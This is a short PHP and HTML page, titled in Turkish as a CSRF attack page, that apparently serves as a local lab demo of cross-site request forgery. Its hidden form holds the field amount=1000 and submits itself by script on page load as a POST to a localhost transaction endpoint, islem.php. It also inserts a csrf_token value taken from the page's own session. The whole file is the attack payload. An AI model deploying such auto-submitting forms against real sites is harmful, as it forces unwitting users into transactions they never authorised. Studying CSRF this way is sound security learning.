<?php
session_start();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CSRF Saldırı Sayfası</title>
</head>
<body>
    <h1>CSRF Saldırısı</h1>
    <form id="csrfForm" action="http://localhost/berat/islem.php" method="POST">
        <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
        <input type="hidden" name="amount" value="1000">
    </form>
    <script>
        document.getElementById('csrfForm').submit();
    </script>
</body>
</html>
